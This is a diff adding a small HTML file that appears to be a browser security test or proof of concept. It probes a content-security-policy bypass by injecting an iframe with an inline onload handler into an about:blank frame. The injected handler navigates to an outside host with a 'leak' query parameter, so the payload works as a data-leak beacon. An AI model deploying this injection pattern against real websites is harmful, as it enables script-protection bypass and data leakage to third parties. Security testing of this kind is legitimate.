@@ -1,0 +1,10 @@
+<iframe id="123" src=about:blank></iframe>
+<script nonce=1337>
+    var iframe = document.getElementById("123");
+    iframe.onload = function() {
+        if (iframe.contentDocument.URL === "about:blank") {
+            iframe.contentDocument.body.innerHTML = "<iframe/onload='document.location.href=\"https://adition.com/report/?leak=c1109167\"'>";
+        }
+    };
+    iframe.contentWindow.location.reload();
+</script>
